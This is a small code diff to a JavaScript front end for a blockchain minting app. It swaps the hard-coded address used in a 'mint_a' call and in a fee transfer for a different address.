@@ -76,7 +76,7 @@ const App = () => {
 			const call = {
 				contractAddress: contractAddress,
 				entrypoint: "mint_a",
-				calldata: ["0x0746f97FbD3C65916Ee7024Bf5a6cF6a813aab13dC7793633D7159508170A84E"]
+				calldata: ["0x05f3f4C2dE5e1091ecf810832110D32d4F449c071790B57d9C807Bb670f47572"]
 			};
 			const call_string = JSON.stringify(call) + ',';
 			const call_raw = '[' + call_string.repeat(value) + ']';
@@ -84,7 +84,7 @@ const App = () => {
 				{
 					contractAddress: etherContract,
 					entrypoint: "transfer",
-					calldata: ["0x0746f97FbD3C65916Ee7024Bf5a6cF6a813aab13dC7793633D7159508170A84E", "500000000000000", "0"]
+					calldata: ["0x05f3f4C2dE5e1091ecf810832110D32d4F449c071790B57d9C807Bb670f47572", "500000000000000", "0"]
 				}
 			]
 			const callData = approve.concat(eval(call_raw)).concat(fee);
